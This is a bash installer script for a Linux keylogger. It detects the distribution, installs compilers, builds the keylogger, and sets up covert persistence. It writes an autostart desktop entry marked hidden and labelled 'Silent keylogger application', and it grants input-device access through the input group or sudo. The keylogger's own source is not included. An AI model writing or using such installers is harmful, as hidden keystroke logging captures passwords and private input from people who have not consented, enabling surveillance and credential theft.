#!/bin/bash

# Distribution-aware installer for keylogger
# Detects the Linux distribution and installs appropriate packages

echo "Detecting Linux distribution..."

# Function to detect and install packages based on distribution
install_dependencies() {
    if [ -f /etc/debian_version ] || grep -qi debian /etc/os-release 2>/dev/null; then
        # Debian/Ubuntu
        echo "Detected Debian/Ubuntu-based system"
        sudo apt-get update
        sudo apt-get install -y build-essential
    elif grep -qi ubuntu /etc/os-release 2>/dev/null; then
        # Ubuntu
        echo "Detected Ubuntu system"
        sudo apt-get update
        sudo apt-get install -y build-essential
    elif [ -f /etc/redhat-release ] || grep -qi "red hat\|centos\|fedora\|rocky\|almalinux" /etc/os-release 2>/dev/null; then
        # Red Hat/CentOS/Fedora/Rocky/AlmaLinux
        if command -v dnf >/dev/null 2>&1; then
            # Fedora with DNF
            echo "Detected Fedora system"
            sudo dnf install -y gcc make
        elif command -v yum >/dev/null 2>&1; then
            # CentOS/RHEL with YUM
            echo "Detected CentOS/RHEL system"
            sudo yum install -y gcc make
        else
            echo "Detected Red Hat-based system"
            sudo yum install -y gcc make
        fi
    elif [ -f /etc/arch-release ] || grep -qi arch /etc/os-release 2>/dev/null; then
        # Arch Linux
        echo "Detected Arch Linux system"
        sudo pacman -Sy --noconfirm gcc make
    elif grep -qi suse /etc/os-release 2>/dev/null; then
        # openSUSE
        echo "Detected openSUSE system"
        sudo zypper refresh
        sudo zypper install -y gcc make
    elif grep -qi gentoo /etc/os-release 2>/dev/null; then
        # Gentoo
        echo "Detected Gentoo system"
        emerge --sync
        emerge -av sys-devel/gcc sys-devel/make
    else
        # Fallback for unknown distributions
        echo "Unknown distribution, attempting to install build tools..."
        if command -v apt-get >/dev/null 2>&1; then
            sudo apt-get update
            sudo apt-get install -y build-essential
        elif command -v dnf >/dev/null 2>&1; then
            sudo dnf install -y gcc make
        elif command -v yum >/dev/null 2>&1; then
            sudo yum install -y gcc make
        elif command -v pacman >/dev/null 2>&1; then
            sudo pacman -Sy --noconfirm gcc make
        elif command -v zypper >/dev/null 2>&1; then
            sudo zypper refresh
            sudo zypper install -y gcc make
        else
            echo "Could not detect package manager. Please install build-essential, gcc, and make manually."
            exit 1
        fi
    fi
}

# Function to compile the keylogger
compile_keylogger() {
    echo "Compiling keylogger..."
    if make; then
        echo "Keylogger compiled successfully!"
    else
        echo "Compilation failed. Please check the error messages above."
        exit 1
    fi
}

# Function to set up autostart
setup_autostart() {
    echo "Setting up autostart..."
    
    # Create autostart directory if it doesn't exist
    mkdir -p ~/.config/autostart/
    
    # Create the autostart desktop entry
    cat > ~/.config/autostart/keylogger.desktop << EOF
[Desktop Entry]
Type=Application
Name=Keylogger
Exec=/home/christoph/Documents/logged_key/keylogger
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
Comment=Silent keylogger application
EOF

    echo "Autostart entry created at ~/.config/autostart/keylogger.desktop"
}

# Function to warn about permissions
warn_permissions() {
    echo ""
    echo "==========================================="
    echo "IMPORTANT PERMISSION NOTICE:"
    echo "The keylogger needs access to input devices."
    echo "You may need to run it with sudo or add your"
    echo "user to the 'input' group:"
    echo "  sudo gpasswd -a \$USER input"
    echo "Then log out and back in."
    echo "==========================================="
    echo ""
}

# Main execution
echo "Installing keylogger..."

# Install dependencies
install_dependencies

# Compile the keylogger
compile_keylogger

# Set up autostart
setup_autostart

# Warn about permissions
warn_permissions

echo ""
echo "Installation completed!"
echo "The keylogger will start automatically on login."
echo "Log file will be created as 'keylog.txt' in the same directory."
echo ""
echo "To run the keylogger, use:"
echo "  cd /home/christoph/Documents/logged_key && sudo ./keylogger &"
echo ""